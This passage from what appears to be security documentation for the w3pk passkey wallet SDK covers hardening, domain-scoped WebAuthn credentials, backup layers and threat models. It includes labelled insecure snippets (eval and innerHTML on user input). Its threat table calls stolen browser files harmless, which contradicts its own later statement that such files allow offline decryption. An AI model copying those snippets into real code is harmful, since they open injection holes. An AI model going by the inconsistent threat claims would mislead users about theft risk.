      hash = hash & hash
    }
    return hash.toString(36)
  }
}

// Use in critical operations
const checker = new IntegrityChecker()
if (!checker.verify()) {
  throw new Error('Code integrity check failed - possible tampering')
}
```

#### Freeze Critical Objects

```typescript
// Prevent prototype pollution and tampering
Object.freeze(Object.prototype)
Object.freeze(Array.prototype)
Object.freeze(String.prototype)

// Freeze critical SDK methods
Object.freeze(w3pk.signMessage)
Object.freeze(w3pk.exportMnemonic)
Object.freeze(w3pk.deriveWallet)
```

#### Secure Coding Patterns

```typescript
// ❌ Don't use eval or Function constructor
eval(userInput) // NEVER
new Function(userInput)() // NEVER

// ❌ Don't use innerHTML with user content
element.innerHTML = userInput // DANGEROUS

// ✅ Use safe alternatives
element.textContent = userInput
element.setAttribute('data-value', userInput)

// ❌ Don't trust client-side validation only
if (amount > 0) { // Can be bypassed
  transfer(amount)
}

// ✅ Always validate on both sides
async function transfer(amount: number) {
  // Server-side validation
  const response = await fetch('/api/validate', {
    method: 'POST',
    body: JSON.stringify({ amount })
  })

  if (response.ok) {
    // Proceed with transfer
  }
}
```

### 5. Defense in Depth Strategy

Combine multiple layers:

```typescript
const w3pk = new Web3Passkey({
  // 1. Short sessions (limit attack window)
  sessionDuration: 0.1, // 6 minutes

  // 2. Callbacks for security events
  onError: (error) => {
    // Log security events
    reportSecurityEvent({
      type: 'error',
      message: error.message,
      timestamp: Date.now()
    })
  }
})

// 3. Rate limiting sensitive operations
const rateLimiter = new RateLimiter({ maxAttempts: 3, windowMs: 60000 })

async function secureSignMessage(message: string) {
  // Check integrity
  if (!integrityChecker.verify()) {
    throw new Error('Code tampering detected')
  }

  // Rate limit
  if (!rateLimiter.attempt()) {
    throw new Error('Too many attempts')
  }

  // Detect extensions
  if (detectExtensionInjection()) {
    console.warn('Extension interference detected')
  }

  // Always require auth for high-value
  const requireAuth = parseAmount(message) > 100

  return w3pk.signMessage(message, { requireAuth })
}
```

### 6. Monitoring and Alerting

```typescript
// Monitor suspicious behavior
class SecurityMonitor {
  private attemptCounts = new Map<string, number>()

  trackOperation(operation: string) {
    const count = (this.attemptCounts.get(operation) || 0) + 1
    this.attemptCounts.set(operation, count)

    // Alert on suspicious patterns
    if (count > 10) {
      this.alert(`Suspicious: ${operation} called ${count} times`)
    }
  }

  private alert(message: string) {
    // Log to monitoring service
    console.error('[SECURITY]', message)

    // Optional: Send to backend
    fetch('/api/security-alert', {
      method: 'POST',
      body: JSON.stringify({ message, timestamp: Date.now() })
    })
  }
}

const monitor = new SecurityMonitor()
monitor.trackOperation('exportMnemonic')
```

### Summary: Security Checklist

Before deploying w3pk in production:

- [ ] ✅ Content Security Policy configured (strict, no unsafe-inline)
- [ ] ✅ Input sanitization on all user inputs
- [ ] ✅ Output encoding for display
- [ ] ✅ XSS protection via framework defaults
- [ ] ✅ Extension detection implemented
- [ ] ✅ User warnings for security risks
- [ ] ✅ Short session duration configured (< 15 minutes)
- [ ] ✅ Dedicated browser profile recommended to users
- [ ] ✅ npm audit passing with no high/critical issues
- [ ] ✅ Lock files committed and verified
- [ ] ✅ Subresource Integrity for CDN scripts
- [ ] ✅ Dependency monitoring enabled (Snyk/Dependabot)
- [ ] ✅ Minimal dependency tree
- [ ] ✅ Secure build pipeline (minification, no source maps)
- [ ] ✅ Object.freeze on critical prototypes
- [ ] ✅ No eval/Function constructor in codebase
- [ ] ✅ Server-side validation for critical operations
- [ ] ✅ Rate limiting implemented
- [ ] ✅ Security monitoring and alerting
- [ ] ✅ User education materials prepared

## Credential Scoping and Domain Isolation

### Credentials are Domain-Specific

**Important:** Credentials created on one web application **cannot be used on another web application**, even for the same username. This is a fundamental WebAuthn security feature.

### How It Works

When you register a credential, it is cryptographically bound to the domain:

```typescript
// Registration on example.com
const registrationOptions = {
  challenge,
  rp: {
    name: "w3pk",
    id: window.location.hostname,  // "example.com"
  },
  user: {
    id: username,
    name: username,
    displayName: username,
  },
  // ...
}

// Authentication on example.com
const authOptions = {
  challenge,
  rpId: window.location.hostname,  // Must be "example.com"
  userVerification: "required",
  // ...
}
```

**Key Points:**

1. **RP ID is auto-detected**: The Relying Party ID (RP ID) is automatically set to `window.location.hostname`
2. **Cannot be configured**: Manual RP ID configuration was removed in v0.7.0 to enforce security
3. **Cryptographically bound**: The WebAuthn credential private key is tied to the RP ID
4. **Browser-enforced**: The browser's WebAuthn API enforces this isolation

### Why Credentials Don't Work Across Domains

**Example scenario:**

```typescript
// Step 1: Register on app1.com
// User visits: https://app1.com
await w3pk.register({ username: 'alice' })
// → RP ID: "app1.com"
// → Credential created and bound to "app1.com"
// → Stored in browser with origin: "https://app1.com"

// Step 2: Try to login on app2.com
// User visits: https://app2.com
await w3pk.login()
// → RP ID: "app2.com" (different!)
// → Browser WebAuthn API: "No credential found for RP ID 'app2.com'"
// → Login fails ❌

// Step 3: Must register separately on app2.com
await w3pk.register({ username: 'alice' })
// → Creates NEW credential for "app2.com"
// → This is a completely separate credential
```

### Security Guarantees

This domain isolation provides critical security guarantees:

#### ✅ Protection Against Phishing

```typescript
// Legitimate site: example.com
await w3pk.register({ username: 'alice' })
// RP ID: "example.com"

// Phishing site: examp1e.com (note the "1")
await w3pk.login()
// RP ID: "examp1e.com" (different!)
// ❌ Credential not found - phishing attempt blocked
```

The attacker **cannot** use your `example.com` credential even if they:
- Copy your localStorage data
- Copy your IndexedDB data
- Trick you into visiting their site
- Use an identical UI

The browser enforces that credentials for `example.com` can only be used on `example.com`.

#### ✅ Origin-Based Storage Isolation

```typescript
// Browser storage is automatically scoped by origin
localStorage  // Scoped to "https://example.com"
IndexedDB     // Scoped to "https://example.com"

// A different origin cannot access this storage
// - https://attacker.com → different origin
// - https://subdomain.example.com → different origin (unless RP ID configured for parent)
// - http://example.com → different origin (different protocol)
```

#### ✅ No Cross-Site Credential Replay

```typescript
// Even if attacker intercepts network traffic
const stolenSignature = interceptFromNetwork()

// They cannot replay it on their site
await navigator.credentials.get({
  publicKey: {
    challenge: stolenChallenge,
    rpId: "attacker.com",  // Different RP ID!
    // ...
  }
})
// ❌ Browser rejects: "RP ID mismatch"
```

### Subdomain Considerations

**By default, credentials are scoped to the exact hostname:**

```typescript
// Registered on: app.example.com
// RP ID: "app.example.com"

// Cannot use on: api.example.com (different subdomain)
// Cannot use on: example.com (parent domain)
```

**Note:** The WebAuthn standard allows setting RP ID to a parent domain, but w3pk uses auto-detection which sets it to the exact hostname for maximum security.

### Localhost and Development

During development, credentials are scoped to `localhost`:

```typescript
// Development environment
window.location.hostname  // "localhost"
// RP ID: "localhost"

// Credentials created during development:
// ✅ Work on: http://localhost:3000
// ✅ Work on: http://localhost:8080
// ✅ Work on: https://localhost:5173
// ❌ Don't work on: 127.0.0.1 (different hostname!)
```

**Development tip:** Always use `localhost`, not `127.0.0.1`, for consistent RP ID.

### Migration from v0.6.0 to v0.7.0

In v0.6.0, the RP ID could be manually configured:

```typescript
// v0.6.0 (old)
const w3pk = createWeb3Passkey({
  rpId: 'example.com',  // Manual configuration
})
```

In v0.7.0+, this was removed for security:

```typescript
// v0.7.0+ (current)
const w3pk = createWeb3Passkey({
  // rpId is auto-detected from window.location.hostname
  // Cannot be overridden
})
```

**Why this change?**
- Prevents misconfiguration
- Enforces best practices
- Eliminates cross-origin credential risks
- Simplifies API

### Credential Storage and Scoping

**What's stored and where:**

```typescript
// localStorage (origin-scoped by browser)
// Key: w3pk_credential_<credentialId>
{
  "id": "credential-abc123",
  "publicKey": "MFkw...",      // Public key only
  "username": "alice",
  "ethereumAddress": "0x1234...",
  "createdAt": 1234567890
}

// IndexedDB (origin-scoped by browser)
// Store: wallets
{
  "ethereumAddress": "0x1234...",
  "encryptedMnemonic": "v1kT...",  // AES-GCM encrypted
  "credentialId": "credential-abc123",
  "createdAt": 1234567890
}

// Authenticator (hardware/platform)
// WebAuthn private key (bound to RP ID)
// - Cannot be exported
// - Cannot be used for different RP ID
// - Hardware-protected
```

**Security properties:**

1. **localStorage**: Origin-scoped by browser (cannot access from different origin)
2. **IndexedDB**: Origin-scoped by browser + encrypted with WebAuthn signature
3. **Authenticator**: RP ID-bound + hardware-protected

### Common Questions

**Q: Can I use the same wallet on multiple domains?**

A: No, each domain requires separate registration. However, you can import the same mnemonic on different domains to access the same wallet addresses:

```typescript
// On domain1.com
const { mnemonic } = await w3pk.register({ username: 'alice' })
// Save mnemonic: "word1 word2 ... word12"

// On domain2.com (later)
await w3pk.register({
  username: 'alice',
  mnemonic: 'word1 word2 ... word12'  // Import same mnemonic
})
// ✅ Same wallet addresses, different WebAuthn credential
```

**Q: What if I want to share credentials across subdomains?**

A: Currently not supported. Each subdomain requires separate registration. This is the most secure approach.

**Q: Can I migrate credentials between domains?**

A: WebAuthn credentials cannot be migrated, but wallets can:

1. Export mnemonic from old domain
2. Register on new domain with same mnemonic
3. Same wallet addresses, new credential

**Q: What happens if I switch from `app.example.com` to `example.com`?**

A: These are different RP IDs. You'll need to re-register. Export your mnemonic first to preserve your wallet.

### Security Best Practices

1. **Educate users**: Make it clear that credentials are per-domain
2. **Prompt for backup**: Always prompt users to save their mnemonic after registration
3. **Test on production domain**: Don't expect development credentials to work in production
4. **Use consistent domains**: Avoid switching between `www.example.com` and `example.com`
5. **Display current domain**: Show users which domain they're authenticating for

### Implementation Example

```typescript
// Show user which domain they're registering on
const currentDomain = window.location.hostname

console.log(`🔐 Creating credential for: ${currentDomain}`)
console.log(`⚠️  This credential will only work on ${currentDomain}`)

await w3pk.register({ username: 'alice' })

console.log(`✅ Credential created for ${currentDomain}`)
console.log(`💾 Save your recovery phrase - you'll need it to access`)
console.log(`   this wallet on other domains or devices`)
```

## WebAuthn Security Features

### User Verification
w3pk enforces `userVerification: "required"`, which means:

- **Platform authenticators** (TouchID, FaceID, Windows Hello):
  - Biometric verification required
  - Local-only (biometric never leaves device)
  - Hardware-protected

- **Security keys** (YubiKey, etc.):
  - PIN required
  - FIDO2 certified hardware
  - Tamper-resistant

### Credential Protection
- **Resident credentials** (discoverable):
  - Stored in authenticator hardware
  - Protected by Secure Enclave/TPM
  - Cannot be extracted

- **Private key** never exposed:
  - Signature operations happen in hardware
  - Key never enters browser/OS memory
  - Cannot be dumped or stolen

## Authenticator's Built-In Credential Storage

### What Is It?

Modern authenticators (TouchID, Windows Hello, YubiKey) have **built-in secure storage** for credentials. This is separate from browser storage and provides additional security.

### How It Works

```
┌─────────────────────────────────────────┐
│ Your Computer                            │
│                                          │
│  Browser Storage (localStorage)         │
│  ┌─────────────────────────────────┐    │
│  │ • Username                       │    │
│  │ • Public key (safe)              │    │
│  │ • Ethereum address              │    │
│  └─────────────────────────────────┘    │
│                                          │
│  IndexedDB                               │
│  ┌─────────────────────────────────┐    │
│  │ • Encrypted wallet              │    │
│  │ • Credential ID                 │    │
│  └─────────────────────────────────┘    │
│                                          │
│  ┌───────────────────────────────────┐  │
│  │ Secure Enclave / TPM              │  │
│  │ (Hardware Protected)              │  │
│  │                                   │  │
│  │ ✓ WebAuthn Private Key           │  │
│  │ ✓ Credential Metadata            │  │
│  │ ✓ Touch/Face biometric data      │  │
│  │                                   │  │
│  │ ❌ Cannot be exported             │  │
│  │ ❌ Cannot be copied               │  │
│  │ ❌ Survives OS reinstall (iOS)    │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

### Security Benefits

1. **Hardware Protection**
   - Private keys stored in Secure Enclave (iOS) or TPM (Windows)
   - Cannot be extracted even with root/admin access
   - Survives malware/OS compromise

2. **Biometric Storage**
   - Fingerprints/face data NEVER leave device
   - Stored in encrypted hardware
   - Matched locally in secure element

3. **Credential Backup** (Platform-dependent)
   - **iCloud Keychain** (iOS/macOS):
     - Credentials sync across user's Apple devices
     - End-to-end encrypted
     - Requires device unlock

   - **Windows Hello**:
     - Tied to specific device/TPM
     - Does NOT sync by default
     - Requires device PIN

   - **Android**:
     - Can backup to Google account
     - End-to-end encrypted
     - Requires screen unlock

### Considerations for w3pk

**The authenticator stores:**
- ✅ WebAuthn private key (secure)
- ✅ Credential metadata (credential ID, RP ID)
- ❌ **NOT** the wallet mnemonic

**The wallet mnemonic is stored:**
- In browser IndexedDB (encrypted)
- Can only be decrypted with WebAuthn signature
- Requires fresh biometric authentication

**This means:**
- Losing your authenticator = Lose access to decrypt wallet
- **CRITICAL:** Users must save their mnemonic phrase
- Mnemonic is the ultimate recovery mechanism
- WebAuthn is for convenience + security, not recovery

## Backup & Recovery Security

w3pk implements a **three-layer backup and recovery system** that balances security, usability, and resilience. Each layer uses different cryptographic primitives and trust models.

### Layer 1: Passkey Auto-Sync (Platform-Based)

**How it works:**
- WebAuthn credentials automatically sync via platform services (iCloud Keychain, Google Password Manager, Microsoft Account)
- Encrypted end-to-end by platform provider
- Requires device unlock + cloud account authentication

**Security properties:**
- ✅ **Encrypted in transit** - Platform handles E2E encryption
- ✅ **Hardware-backed** - Credentials protected by Secure Enclave/TPM
- ✅ **Automatic** - No user action required
- ⚠️ **Platform trust** - Relies on Apple/Google/Microsoft security
- ⚠️ **Ecosystem lock-in** - Cannot cross platforms (Apple → Android)

**Threat model:**
| Threat | Protected? | Notes |
|--------|-----------|-------|
| Device loss (same ecosystem) | ✅ Yes | Credentials restore on new device |
| Device loss (cross-platform) | ❌ No | Need Layer 2 (mnemonic) |
| Platform account compromise | ⚠️ Depends | Platform MFA protects |
| State-level attack on cloud | ⚠️ Possible | Platform E2E encryption helps |

### Layer 2: Encrypted Backups (User-Controlled)

**How it works:**
- Mnemonic encrypted with user-chosen password
- Multiple backup formats: QR codes and backup files
- Encryption: **AES-256-GCM** with **PBKDF2** (310,000 iterations, OWASP 2025 standard)

**Security properties:**
- ✅ **Military-grade encryption** - AES-256-GCM
- ✅ **Password-based** - User controls secret
- ✅ **Offline storage** - Can be stored on paper/USB/safe
- ✅ **Platform-independent** - Works across any device
- ⚠️ **Password strength critical** - Weak password = vulnerable

**Cryptographic details:**
```typescript
// Key derivation
PBKDF2-SHA256
├─ Iterations: 310,000 (OWASP 2025)
├─ Salt: 32 bytes (random per backup)
└─ Output: 256-bit key

// Encryption
AES-256-GCM
├─ Key: From PBKDF2
├─ IV: 12 bytes (random per encryption)
├─ Auth tag: 16 bytes (automatic)
└─ Additional data: Ethereum address (for integrity)
```

**Password validation:**
w3pk enforces strong passwords:
- Minimum 12 characters
- Uppercase + lowercase + numbers + special chars
- Not in common password list
- Strength score ≥50/100 required

**Using `isStrongPassword` utility:**
```typescript
import { isStrongPassword } from 'w3pk'

// Validate before creating backups
const password = userInput
if (!isStrongPassword(password)) {
  throw new Error('Password must be at least 12 characters with uppercase, lowercase, numbers, and special characters')
}

// Now safe to create backup
const blob = await w3pk.createZipBackup(password)
```

**Examples:**
```typescript
// Test fixtures - not real passwords!
isStrongPassword('Test1234!@#$')        // ✅ true
isStrongPassword('Example1@Correct')    // ✅ true
isStrongPassword('weak')                // ❌ false - too short
isStrongPassword('NoNumbersHere!')      // ❌ false - missing numbers
isStrongPassword('Password123!Foo')     // ❌ false - contains "password"
```

**Threat model:**
| Threat | Protected? | Notes |
|--------|-----------|-------|
| Backup file stolen | ✅ Yes | Requires password to decrypt |
| Weak password | ⚠️ Vulnerable | User responsibility |
| Password forgotten | ❌ Unrecoverable | Need Layer 3 (social recovery) |
| Brute force (strong password) | ✅ Yes | 310k iterations slow down attacks |
| Brute force (weak password) | ❌ Vulnerable | Minutes to hours with GPU |

**Brute force analysis:**

Assuming attacker has:
- Modern GPU (RTX 4090)
- ~100,000 PBKDF2-SHA256 hashes/second at 310k iterations

| Password Type | Entropy | Time to Crack |
|--------------|---------|---------------|
| `password123` (common) | ~20 bits | Seconds |
| `MyPassword123!` (weak) | ~35 bits | Hours |
| `MyS3cur3!Pass@2024` (medium) | ~50 bits | Months |
| `correct horse battery staple` (strong) | ~80 bits | Centuries |
| Truly random 16 chars | ~100 bits | Universe lifetime |

**Recommendation:** Use password manager to generate strong passwords or use multi-word passphrases (4+ random words).

### Layer 3: Social Recovery (Distributed Trust)

**How it works:**
- Mnemonic split into **N shares** using **Shamir Secret Sharing**
- Requires **M-of-N** shares to recover (e.g., 3-of-5)
- Each guardian receives encrypted share via QR code
- Guardians never see the actual mnemonic

**Cryptographic details:**
```typescript
// Shamir Secret Sharing over GF(256)
├─ Threshold: M (minimum shares needed)
├─ Total shares: N (total guardians)
├─ Secret: Mnemonic (67 bytes UTF-8)
├─ Polynomial degree: M-1
├─ Field: Galois Field GF(256)
│   ├─ Primitive polynomial: x^8 + x^4 + x^3 + x + 1 (0x11b)
│   ├─ Generator: 3
│   └─ Lagrange interpolation for reconstruction
└─ Share format:
    ├─ Byte 0: X coordinate (1-255)
    └─ Bytes 1-67: Y values (polynomial evaluation)

// Guardian share encryption
AES-256-GCM (same as Layer 2)
├─ Optional: Guardian can password-protect their share
└─ QR code includes guardian metadata + instructions
```

**Security properties:**
- ✅ **Information-theoretic security** - Cannot learn secret from M-1 shares
- ✅ **Distributed trust** - No single point of failure
- ✅ **Privacy-preserving** - Guardians never see mnemonic
- ✅ **Flexible threshold** - Customize M-of-N based on risk tolerance
- ⚠️ **Coordination required** - Must contact M guardians
- ⚠️ **Guardian trust** - Guardians could collude (if ≥M)

**Threat model:**
| Threat | Protected? | Notes |
|--------|-----------|-------|
| M-1 guardians compromised | ✅ Yes | Cannot recover without Mth share |
| M guardians collude | ❌ Vulnerable | Can reconstruct mnemonic |
| All guardians lost | ❌ Unrecoverable | Need Layer 2 backup |
| Guardian share stolen | ✅ Depends | If password-protected, still safe |
| User forgets who guardians are | ⚠️ Problem | Keep guardian list separately |

**Information-theoretic security proof:**

Shamir Secret Sharing over GF(256) provides perfect secrecy:
- Given M-1 shares, **every possible secret is equally likely**
- Attacker learns **zero bits** of information about secret
- No amount of computation can break this (unlike encryption)

Mathematical proof:
```
For threshold M and secret S:
- Polynomial P(x) = a₀ + a₁x + ... + aₘ₋₁x^(M-1)
- Secret: S = P(0) = a₀
- Share i: Sᵢ = P(i)

Given M-1 shares {S₁, S₂, ..., Sₘ₋₁}:
- Infinite polynomials pass through these points
- Each yields different P(0) = a₀
- All secrets equally probable
- H(S | S₁,...,Sₘ₋₁) = H(S)  [Shannon entropy unchanged]
```

**Example configuration:**

| Scenario | Threshold | Guardians | Rationale |
|----------|-----------|-----------|-----------|
| High paranoia | 5-of-7 | 7 close friends | Can lose 2 guardians |
| Balanced | 3-of-5 | 5 trusted contacts | Standard recommendation |
| Convenience | 2-of-3 | 3 family members | Easy to coordinate |
| Multi-sig like | 2-of-2 | 2 co-owners | Both must agree |

### Layered Security Strategy

**Defense in depth:**
```
┌─────────────────────────────────────────────┐
│ Recovery Scenario                            │
├─────────────────────────────────────────────┤
│                                              │
│ Lost Device (Same Platform)                 │
│ └─> Layer 1: Passkey Sync ✅ RECOVERED      │
│                                              │
│ Lost Device (Cross-Platform)                │
│ └─> Layer 1: Failed ❌                       │
│ └─> Layer 2: Encrypted Backup ✅ RECOVERED   │
│                                              │
│ Lost Device + Forgot Password               │
│ └─> Layer 1: Failed ❌                       │
│ └─> Layer 2: Failed ❌                       │
│ └─> Layer 3: Social Recovery ✅ RECOVERED    │
│                                              │
│ Lost Everything + All Guardians Lost        │
│ └─> ❌ UNRECOVERABLE                         │
│                                              │
└─────────────────────────────────────────────┘
```

**Security scoring:**

w3pk calculates a security score (0-100) based on active backup methods:

| Configuration | Score | Level |
|--------------|-------|-------|
| No backups | 0-25 | 🔴 Vulnerable |
| Passkey sync only | 30-50 | 🟡 Protected |
| Passkey + encrypted backup | 60-80 | 🟢 Secured |
| All three layers | 85-100 | 🟦 Fort Knox |

**Score calculation:**
```typescript
score = 0
+ (passkeySync.enabled ? 30 : 0)
+ (backups.file > 0 ? 25 : 0)
+ (backups.qr > 0 ? 15 : 0)
+ (socialRecovery.configured ? 30 : 0)
```

### Backup Best Practices

**1. Use multiple layers:**
```typescript
// ✅ GOOD: Enable all three layers
await w3pk.setupSocialRecovery([...guardians], 3)
await w3pk.createZipBackup('MyS3cur3!Password@2024')
// Passkey sync enabled by default on platform

// ❌ BAD: Rely on single layer
// (only passkey sync - what if switch platforms?)
```

**2. Test recovery before trusting:**
```typescript
// Simulate recovery scenarios
const test1 = await w3pk.simulateRecoveryScenario({
  type: 'lost-device',
  hasBackup: true,
  hasSocialRecovery: true
})
console.log('Can recover?', test1.canRecover)

const test2 = await w3pk.simulateRecoveryScenario({
  type: 'lost-phrase',
  hasPasskeySync: true
})
console.log('Can recover?', test2.canRecover)
```

**3. Store backups securely:**
```typescript
// ✅ GOOD: Offline, encrypted, geographically distributed
- Physical safe (home)
- Safety deposit box (bank)
- Encrypted USB drive (office)
- Password manager (different password)

// ❌ BAD: Digital-only, centralized
- Cloud storage unencrypted
- Email to self
- Single location
- Shared with others
```

**4. Choose guardians wisely:**
```typescript
// ✅ GOOD guardian criteria:
- Trustworthy (won't collude)
- Available (can reach when needed)
- Technical (understands basic security)
- Diverse (different locations/relationships)
- Long-term (stable relationship)

// ❌ BAD guardian choices:
- All family members (could collude)
- All same location (disaster risk)
- Strangers/acquaintances
- People who might lose share
```

**5. Use strong passwords:**
```typescript
// ✅ GOOD passwords:
'correct horse battery staple'  // Multi-word passphrase
'MyS3cur3!Backup@December2024'  // Long with variety
(password manager generated)     // Truly random

// ❌ BAD passwords:
'password123'      // Common
'MyPassword'       // Dictionary word
'12345678'         // Sequential
'qwerty123'        // Keyboard pattern
```

### API Security Considerations

**All backup operations require authentication:**
```typescript
// These operations trigger biometric prompt
await w3pk.createZipBackup(password)        // ✅ Auth required
await w3pk.createQRBackup(password)         // ✅ Auth required
await w3pk.setupSocialRecovery(...)         // ✅ Auth required
await w3pk.exportMnemonic()                 // ✅ Auth required

// Read-only operations don't require auth
await w3pk.getBackupStatus()                // ✅ No auth needed
await w3pk.getSyncStatus()                  // ✅ No auth needed
```

**Password validation is client-side:**
⚠️ **Important:** Password strength is checked in the browser. A determined attacker with code execution could bypass validation and create backups with weak passwords.

**Mitigation:**
- Use `requireAuth: true` for backup creation
- Short session durations
- XSS/injection protection (CSP, input sanitization)
- Educate users on password strength

**Recovery operations don't require authentication:**
```typescript
// Recovery from existing backups is public
await w3pk.restoreFromBackup(encryptedData, password)
await w3pk.recoverFromGuardians([shares...])

// Rationale: If user has backup data + password/shares,
// they own the wallet regardless of authentication
```

### Comparison with Other Recovery Systems

| Recovery Method | w3pk Layer 1 | w3pk Layer 2 | w3pk Layer 3 | Traditional Seed | Hardware Wallet |
|----------------|--------------|--------------|--------------|------------------|-----------------|
| **Automatic** | ✅ Yes | ❌ Manual | ❌ Manual | ❌ Manual | ❌ Manual |
| **Cross-platform** | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes |
| **Offline storage** | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes | N/A |
| **No single point** | ❌ No | ❌ No | ✅ Yes | ❌ No | ❌ No |
| **Cryptographic** | ✅ E2E | ✅ AES-256 | ✅ Shamir | N/A | N/A |
| **User effort** | None | Medium | High | Low | None |
| **Trust model** | Platform | Self | Distributed | Self | Self |

## Best Practices for Users

### 1. **Always Save Your Mnemonic**
```typescript
const { mnemonic } = await w3pk.register({ username: 'alice' })

// ⚠️ CRITICAL: Save this offline
console.log('Write this down:', mnemonic)
```

**Why?**
- If you lose/reset your device, mnemonic is only recovery
- WebAuthn credentials are device-specific
- Hardware failure = need mnemonic

### 2. **Understand Your Authenticator**

| Authenticator | Backup? | Sync? | Recovery |
|--------------|---------|-------|----------|
| TouchID/FaceID (iCloud enabled) | ✅ Yes | ✅ Yes | Other Apple devices |
| TouchID/FaceID (iCloud disabled) | ❌ No | ❌ No | Mnemonic only |
| Windows Hello | ❌ No | ❌ No | Mnemonic only |
| Android (Google backup) | ✅ Yes | ✅ Yes | Other Android devices |
| YubiKey | ❌ No | ❌ No | Mnemonic only |

### 3. **Device Loss Scenarios**

**Scenario 1: Lost iPhone (iCloud Keychain enabled)**
- ✅ Get new iPhone
- ✅ Sign into iCloud
- ✅ WebAuthn credentials restore automatically
- ✅ Can decrypt wallet (no mnemonic needed)

**Scenario 2: Lost iPhone (iCloud Keychain disabled)**
- ❌ WebAuthn credentials lost
- ✅ Import mnemonic on new device
- ✅ Re-register with new WebAuthn credential
- ✅ Wallet recovered

**Scenario 3: Wiped Computer**
- ❌ All browser data lost
- ❌ WebAuthn credentials lost (except external security keys)
- ✅ Import mnemonic
- ✅ Re-register
- ✅ Wallet recovered

## Threat Model Summary

| Threat | Protected? | How |
|--------|-----------|-----|
| Malware steals browser files | ✅ Yes | Files are encrypted, key requires biometric |
| Keylogger captures password | ✅ Yes | No password - uses biometric |
| Phishing site | ⚠️ Partial | WebAuthn checks domain, but user must verify |
| Physical device theft | ✅ Yes | Biometric/PIN required |
| Database dump | ✅ Yes | Wallet encrypted with signature-derived key |
| Active session hijacking | ❌ No | If wallet in memory, can be accessed |
| Device loss without backup | ⚠️ Depends | Need mnemonic if authenticator not backed up |
| Coercion (forced authentication) | ❌ No | Cannot prevent forced biometric |

## Security Recommendations

### For Developers

1. **Never store secrets** in localStorage/sessionStorage
2. **Always require re-authentication** for sensitive operations
3. **Use `userVerification: "required"`** to enforce biometric/PIN
4. **Prompt users to save mnemonic** prominently during registration
5. **Clear wallet from memory** after operations complete

### For Users

1. **Write down your mnemonic** on paper (offline)
2. **Enable authenticator backup** if available (iCloud Keychain, etc.)
3. **Test recovery** before storing significant funds
4. **Use strong device security** (PIN/password)
5. **Verify domain** before authenticating
6. **Keep devices updated** for security patches

## Comparison: w3pk vs Traditional Wallets

| Feature | w3pk | MetaMask | Hardware Wallet |
|---------|------|----------|-----------------|
| Password required | ❌ No | ✅ Yes | ❌ No (PIN on device) |
| Biometric auth | ✅ Yes | ❌ No | ❌ No |
| Seed phrase backup | ✅ Required | ✅ Required | ✅ Required |
| File access = theft? | ⚠️ **Partial*** | ⚠️ **Partial*** | ❌ No |
| Keylogger risk | ❌ **No** | ✅ **Yes** | ❌ No |
| XSS risk (active session) | ⚠️ **Yes** | ⚠️ **Yes** | ⚠️ Limited (per-tx) |
| Remote attack protection | ✅ Strong | ⚠️ Password-dependent | ✅ Strong |
| Offline brute force | ⚠️ Possible† | ⚠️ Possible† | ❌ Not possible |
| Hardware required | ❌ No | ❌ No | ✅ Yes |
| Cost | Free | Free | $50-200 |
| Best for | Convenience + Security | General use | High-value holdings |

**\*File access = theft?**
- **w3pk:** Can decrypt mnemonic with localStorage + IndexedDB. Requires device encryption for full protection.
- **MetaMask:** Can decrypt vault with password. Weak passwords are vulnerable to brute force.
- **Hardware Wallet:** Private keys never leave device. File access doesn't help attacker.

**†Offline brute force:**
- **w3pk:** Attacker needs actual credential metadata (32+ byte random ID). Not guessable, but if stolen with encrypted wallet, can decrypt offline.
- **MetaMask:** Attacker needs password. Weak passwords can be brute-forced. Strong passwords with vault encryption are resistant.
- **Hardware Wallet:** Private keys in secure element. Cannot be extracted even with physical access (except advanced hardware attacks).

## Conclusion

w3pk's security model combines **WebAuthn authentication** with **deterministic encryption** to provide strong protection against remote attacks and convenient biometric access. Understanding both the strengths and limitations is critical for secure deployment.

**Key Security Properties:**

1. **Strong Protection Against Remote Attacks**
   - WebAuthn authentication required for SDK operations
   - Domain-scoped credentials prevent phishing
   - No keylogger risk (biometric, not password)
   - Better than password-based wallets for online threats

2. **Encryption At Rest (with caveats)**
   - Wallet encrypted with AES-256-GCM
   - Key derived from credential metadata (deterministic)
   - **Important:** An attacker with file system access CAN decrypt offline
   - Real protection comes from SDK authentication-gating, not cryptographic impossibility

3. **Defense in Depth Required**
   - Use device encryption (FileVault, BitLocker, etc.)
   - Use strong device passwords
   - Keep sessions short or disabled for sensitive apps
   - Implement XSS prevention (CSP, input sanitization)
   - Don't rely solely on w3pk encryption for protection

**What You Need to Know:**

An attacker would need different things depending on their goal:

**To decrypt the wallet offline (outside w3pk):**
- Access to browser storage files (localStorage + IndexedDB)
- Can then import mnemonic into any wallet

**To use the wallet via w3pk SDK:**
- Physical access to your device, AND
- Your fingerprint/face/PIN to authenticate, OR
- Code execution during active session (XSS)

**Best Practices:**
- ✅ Save your mnemonic securely (ultimate recovery)
- ✅ Use device encryption + strong device password
- ✅ Short sessions for sensitive applications (`sessionDuration: 0.1` or `0`)
- ✅ Implement XSS prevention (this is critical)
- ✅ Understand that w3pk provides convenience + authentication gating, not cryptographic impossibility
- ✅ Use hardware wallets for very high-value holdings (>$10k)

w3pk provides a strong balance between **security and usability** for most web3 applications. It's significantly more secure than password-based wallets against online threats, while providing biometric convenience. However, it should be deployed with proper device security and XSS prevention for maximum protection.
